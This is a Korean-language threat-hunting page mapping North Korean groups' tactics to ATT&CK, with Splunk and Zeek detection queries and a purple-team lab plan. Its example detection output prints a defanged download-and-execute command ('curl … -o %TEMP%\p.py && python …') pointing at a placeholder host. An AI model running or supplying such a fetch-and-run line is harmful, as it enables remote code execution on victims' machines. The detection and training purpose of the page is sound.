---
title: 북한 — TTP와 헌팅
tags:
  - threat-intel
  - apt
  - dprk
  - detection
---

# 북한 — TTP와 헌팅 { #north-korea-ttps-hunting }

<div class="dfir-meta" markdown>
**분류:** 행위자 TTP → 탐지 · **대상:** Lazarus, APT38/BlueNoroff, TraderTraitor, AppleJeus 클러스터, Andariel, Kimsuky, APT37 · **최종 수정:** 2026-10-07
</div>

!!! abstract "요약"
    북한의 공격 방식을 단계별로 정리합니다: 어떻게 들어오는지(가짜 채용 담당자, 코딩 테스트, 오염된 패키지, 공급망, 문서 미끼), 무엇이 실행되는지, 자격 증명과 **클라우드 세션 토큰**을 어떻게 훔치는지, 어떻게 피벗하고 최종적으로 무엇을 하는지. 모든 단계를 ATT&CK와 이 사이트의 기법 페이지에 매핑했고, 이어서 Splunk와 Zeek에서 실행할 수 있는 헌팅 쿼리를 제공합니다. 그룹에 대한 배경은 [그룹과 사건](dprk-overview.md)에 있습니다.

## 단계별 공격 방식 { #the-playbook-by-phase }

### 1. 초기 접근 — 사람을 노립니다 { #1-initial-access-they-target-the-person }

| 행위 | ATT&CK | 누가 (보고 기준) | 어디를 볼까 |
|---|---|---|---|
| LinkedIn/Telegram/WhatsApp의 가짜 채용 담당자가 "직무 설명" PDF나 링크를 보냄 | T1566.003 (Spearphishing via Service), T1566.002 | Lazarus (Dream Job), TraderTraitor | 브라우저 다운로드, `Zone.Identifier`, 이메일/프록시 로그 |
| "과제형 코딩 테스트" — 피해자가 `npm install` / `python main.py`로 실행하는 GitHub/Bitbucket 저장소나 ZIP | T1204.002 (Malicious File), T1195.001 | TraderTraitor, Contagious Interview | `node`, `python`, `docker` 아래의 프로세스 트리 |
| 악성 또는 이름을 비슷하게 위장한(typosquatting) **npm / PyPI** 패키지 | T1195.001 (Compromise Software Dependencies) | TraderTraitor, Contagious Interview | 패키지 매니페스트, `postinstall` 스크립트, 개발자 호스트의 EDR |
| 트로이 목마가 심긴 거래/암호화폐 앱, 때로는 서명까지 됨 | T1195.002, T1553.002 (Code Signing) | AppleJeus 클러스터 | Amcache에 새로 나타난 서명 없는/게시자가 이상한 바이너리, macOS 격리(quarantine) 이벤트 |
| 고객에게 닿기 위해 **소프트웨어 업체**를 침해 | T1195.002 (Compromise Software Supply Chain), T1199 | AppleJeus 클러스터 (3CX), TraderTraitor (JumpCloud) | 신뢰받는 업체 바이너리가 새로운 네트워크 연결을 맺음 |
| 문서 미끼: ZIP 안의 LNK, CHM, HWP, Office | T1566.001, T1204.002 | Kimsuky, APT37 | [피싱 전달](../adversary/phishing-delivery.md) 참고 |
| 원격으로 채용된 가짜 **구직자**(IT 인력) | T1078 (Valid Accounts), 내부자 | Famous Chollima | 인사(HR) 절차, VPN 지리 정보, 회사 노트북의 원격 관리 도구 |

### 2. 실행과 지속성 { #2-execution-and-persistence }

| 행위 | ATT&CK | 사이트 페이지 |
|---|---|---|
| `node`/`python`이 셸, `curl`, 또는 다운로더를 실행 | T1059.007 (JavaScript), T1059.006 (Python) | — (아래 헌팅 1) |
| PowerShell 다운로드 크래들, 인코딩된 명령 (Windows 미끼) | T1059.001 | [PowerShell 크래들](../adversary/powershell-cradles.md) |
| LNK/CHM 미끼에서 실행되는 `mshta`, `rundll32`, `regsvr32` (Kimsuky) | T1218.005 / .011 / .010 | [LOLBins](../adversary/lolbins.md) |
| 예약 작업, 서비스, Run 키 | T1053.005, T1543.003, T1547.001 | [지속성](../adversary/persistence.md) |
| macOS LaunchAgents / LaunchDaemons | T1543.001, T1543.004 | — (macOS: `~/Library/LaunchAgents`, `/Library/LaunchDaemons`) |
| 메일을 훔치는 악성 브라우저 확장 프로그램 (Kimsuky) | T1176 (Browser Extensions) | 브라우저 프로필의 확장 프로그램 폴더 |
| 신뢰받는 프로세스로의 DLL 사이드로딩 / 인젝션 | T1574.002, T1055 | [프로세스 인젝션](../adversary/process-injection.md) |

### 3. 자격 증명 접근 — 그리고 클라우드 피벗 { #3-credential-access-and-the-cloud-pivot }

바로 이 부분에서 북한 작전은 일반 범죄와 다릅니다: Windows 해시만이 아니라 **개발자 비밀 정보와 클라우드 세션**을 노립니다.

| 행위 | ATT&CK | 사이트 페이지 / 메모 |
|---|---|---|
| 브라우저 비밀번호, 쿠키, 암호화폐 지갑 확장 프로그램 데이터 | T1555.003, T1539 (Steal Web Session Cookie) | 인포스틸러 행위 — 브라우저 프로필 폴더에 대한 파일 접근 |
| SSH 키, `.aws/credentials`, `.env`, `.npmrc`, 키체인 | T1552.001, T1552.004, T1555.001 | 평소와 다른 프로세스가 이 경로들을 읽는지 감시하세요 |
| 탈취한 **클라우드 세션 토큰**을 공격자 인프라에서 재사용 | T1550.001 (Application Access Token), T1078.004 (Cloud Accounts) | 아래 헌팅 3 (CloudTrail) |
| 탈취한 세션으로 새 MFA 기기 등록 | T1098.005 (Device Registration) | 아래 헌팅 3 |
| Windows 네트워크 안에서 LSASS, SAM/NTDS, Kerberos 악용 | T1003, T1558 | [LSASS](../adversary/lsass-dumping.md) · [SAM과 NTDS](../adversary/sam-ntds-extraction.md) · [Kerberoasting](../adversary/kerberoasting.md) |

### 4. 횡적 이동, C2, 최종 목표 { #4-lateral-movement-c2-and-objective }

| 행위 | ATT&CK | 사이트 페이지 |
|---|---|---|
| 탈취한 자격 증명으로 RDP, SMB/PsExec, WMI 사용 | T1021.001, T1021.002, T1047 | [RDP](../adversary/rdp.md) · [PsExec](../adversary/psexec-smb.md) · [WMI](../adversary/wmi-winrm.md) |
| 침해된 정상 웹사이트로의 HTTPS C2; 자체 프로토콜 | T1071.001, T1573 | [비콘과 C2](../network/beaconing-c2.md) |
| **클라우드 스토리지 API**(Dropbox, pCloud, Google Drive, OneDrive)를 통한 C2 — APT37, Kimsuky | T1102.002 (Bidirectional Web Service) | 아래 헌팅 4 |
| 다중 홉 프록시, VPN, 가정용 IP | T1090.003 (Multi-hop Proxy) | 로그인 지리 정보 / ASN 이상 징후 |
| 거래 프런트엔드나 서명 흐름 변조 (Bybit) | T1565 (Data Manipulation) | 웹 자산 / S3 버킷에 대한 파일 무결성 모니터링 |
| 금전 탈취 | T1657 (Financial Theft) | 업무 프로세스 모니터링 |
| 와이퍼 / 랜섬웨어 (Sony, Maui) | T1485, T1486 | [랜섬웨어 플레이북](../playbooks/ransomware.md) |

## 헌팅 { #hunts }

모든 쿼리는 이 사이트의 다른 곳에서 쓰는 BOTSv3 방식의 인덱스와 소스타입을 사용합니다 — `index=`는 내 환경에 맞게 바꾸세요.

=== "1 · 개발 런타임이 셸을 실행"

    ```spl
    index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
        (ParentImage="*\\node.exe" OR ParentImage="*\\python.exe" OR ParentImage="*\\pythonw.exe")
        (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\curl.exe" OR Image="*\\certutil.exe" OR Image="*\\mshta.exe")
    | stats count min(_time) as first max(_time) as last values(CommandLine) as cmd by host, User, ParentImage, Image
    | convert ctime(first) ctime(last)
    ```

    **한 줄씩 설명**

    - `EventID=1` — Sysmon 이벤트 1 = **프로세스 생성**. 새로 생긴 모든 프로세스가 부모 프로세스, 전체 명령줄과 함께 기록됩니다.
    - `ParentImage="*\\node.exe" …` — **부모**가 Node.js나 Python인 프로세스만 남깁니다("코딩 테스트"나 악성 npm/PyPI 패키지가 실행되는 런타임입니다). `\\`는 SPL에서 백슬래시 하나를 쓰는 방법입니다.
    - `Image=…` — **자식**이 셸이나 다운로드 도구인 경우입니다. 개발자도 Node에서 셸을 실행하므로 어느 정도 노이즈(빌드 스크립트)는 예상하세요. 눈여겨볼 것은 무언가를 다운로드하거나 인코딩된 명령을 실행하는 경우입니다.
    - `stats … by host, User, ParentImage, Image` — 조합마다 한 행으로 묶습니다. `values(CommandLine)`은 서로 다른 명령들을 나열합니다.
    - `convert ctime(...)` — epoch 숫자를 읽기 쉬운 날짜로 바꿉니다.

    **결과 예시**

    | 호스트 | 사용자 | 부모 이미지 | 이미지 | 명령 |
    |---|---|---|---|---|
    | DEV-LAPTOP07 | CORP\jkim | C:\Program Files\nodejs\node.exe | C:\Windows\System32\cmd.exe | `cmd /c curl -s hxxp://<ip>/p -o %TEMP%\p.py && python %TEMP%\p.py` |

    macOS/Linux EDR에서도 같은 원리입니다: 부모는 `node` / `python3`, 자식은 `sh`/`bash`/`curl`/`osascript`.

=== "2 · 신뢰받는 업체의 새 바이너리가 외부와 통신"

    ```spl
    index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3
    | stats dc(DestinationIp) as dests values(DestinationHostname) as names min(_time) as first by Image
    | where first > relative_time(now(), "-7d@d")
    | sort - dests
    ```

    - `EventID=3` — Sysmon 네트워크 연결 이벤트입니다.
    - `stats … min(_time) as first by Image` — 프로그램마다 검색 기간 안에서 처음으로 연결을 맺은 시각을 구합니다.
    - `where first > relative_time(now(), "-7d@d")` — **최근 7일 안에 처음 통신을 시작한** 프로그램만 남깁니다("first"가 의미를 가지려면 검색 기간을 30일 이상으로 잡으세요). `relative_time(now(), "-7d@d")` = 7일 전 자정입니다.
    - 이 쿼리는 3CX 패턴을 잡아냅니다: 오래전에 설치된 서명된 앱이 업데이트 후 갑자기 새 도메인에 접속하는 경우입니다.

=== "3 · 클라우드 토큰 재사용과 MFA 기기 추가 (AWS)"

    ```spl
    index=botsv3 sourcetype=aws:cloudtrail
        eventName IN ("CreateVirtualMFADevice","EnableMFADevice","CreateAccessKey","AssumeRole","GetSessionToken","PutBucketPolicy","PutObject")
    | stats values(eventName) as actions dc(sourceIPAddress) as ips values(sourceIPAddress) as src values(userAgent) as ua by userIdentity.arn
    | where ips > 1 OR isnotnull(mvfind(actions,"MFADevice"))
    ```

    - `sourcetype=aws:cloudtrail` — AWS API 감사 로그입니다. 콘솔/API 호출 하나가 이벤트 하나입니다.
    - `eventName IN (...)` — 침입자가 세션을 훔친 뒤 사용하는 호출들입니다: MFA 기기 추가, 키 생성, 역할 맡기(assume role), 버킷 정책 변경, 객체 업로드(Bybit: S3에 있던 프런트엔드 JavaScript가 교체되었습니다).
    - `stats … by userIdentity.arn` — 신원(identity)마다 어떤 작업을 했는지, 출발지 IP가 몇 개인지, 어떤 user agent를 썼는지 정리합니다.
    - `where ips > 1 OR …` — 같은 신원이 **두 개 이상의 IP**에서 사용되었거나(개발자 노트북 + 공격자 VPN) MFA 기기 변경이 있었던 경우입니다. `mvfind(actions,"MFADevice")`는 정규식과 일치하는 첫 번째 값의 위치를 돌려주고, 없으면 null을 돌려줍니다.

=== "4 · 클라우드 스토리지 API를 통한 C2 (Zeek)"

    ```bash
    # SNI / host names of cloud-storage APIs contacted by hosts that are not normal sync clients
    zeek-cut ts id.orig_h server_name < ssl.log \
      | grep -Ei 'api\.dropboxapi\.com|content\.dropboxapi\.com|api\.pcloud\.com|graph\.microsoft\.com|www\.googleapis\.com' \
      | awk '{print $2, $3}' | sort | uniq -c | sort -rn | head -20
    ```

    - `zeek-cut`은 Zeek 로그에서 지정한 열을 뽑아냅니다. `server_name`은 TLS SNI(클라이언트가 요청한 호스트 이름)입니다.
    - `grep`은 프로그램으로 업로드/다운로드할 때 쓰는 API 엔드포인트만 남깁니다 — APT37과 Kimsuky 악성코드는 트래픽이 정상처럼 섞이도록 이것들을 C2로 사용합니다.
    - 출발지 호스트별로 개수를 셉니다: pCloud 클라이언트가 설치되어 있지 않은데 `api.pcloud.com` 연결이 수천 건인 워크스테이션이라면 살펴볼 가치가 있습니다.

## 이 페이지로 만든 퍼플팀 시나리오 { #a-purple-team-scenario-built-from-this-page }

[주간 퍼플팀 루프](../learning/purple-team-loop.md)와 함께 사용하세요:

1. **A주차 — 전달:** 랩 VM에서 `postinstall` 스크립트가 `cmd /c whoami > %TEMP%\out.txt`를 실행하는 무해한 "코딩 테스트" 저장소를 실행합니다. 헌팅 1, Prefetch/Amcache, 그리고 Velociraptor(`Windows.System.Pslist`, `Windows.Forensics.Prefetch`)에서 찾아보세요.
2. **B주차 — 자격 증명 접근:** 스크립트로 가짜 `.aws\credentials` 파일을 읽습니다. 어떤 로그 소스(Sysmon 11? EDR 파일 읽기 텔레메트리?)가 이를 보는지 확인하세요. 아무것도 없다면 그 공백을 기록하세요.
3. **C주차 — 클라우드 피벗:** 프리 티어 랩 AWS 계정에서 같은 액세스 키를 두 개의 IP에서 사용하고 가상 MFA 기기를 추가합니다. CloudTrail에서 헌팅 3이 걸리는지 확인하세요.
4. **D주차 — C2:** 스크립트로 클라우드 스토리지 API에 HTTPS 트래픽을 발생시킵니다. 헌팅 4와 Arkime/Zeek에서 보이는지 확인하세요.
5. 매주 한 페이지씩 작성하세요: **행위 → 아티팩트 → 쿼리 → ATT&CK ID → 공백**.

## 참고 자료 { #references }

- [MITRE ATT&CK — Lazarus Group (G0032)](https://attack.mitre.org/groups/G0032/) — 절차 예시가 포함된 전체 기법 목록
- [MITRE ATT&CK — Kimsuky (G0094)](https://attack.mitre.org/groups/G0094/) · [APT37 (G0067)](https://attack.mitre.org/groups/G0067/)
- [FBI PSA I-022625-PSA — Bybit](https://www.ic3.gov/PSA/2025/PSA250226)
- [Wiz — TraderTraitor deep dive (Bybit attack chain)](https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist)
- [Unit 42 — North Korean threat groups](https://unit42.paloaltonetworks.com/threat-assessment-north-korean-threat-groups-2024)
- 페이지: [그룹과 사건](dprk-overview.md) · [헌팅 패턴](../splunk/hunting-patterns.md) · [Zeek](../network/zeek/index.md)
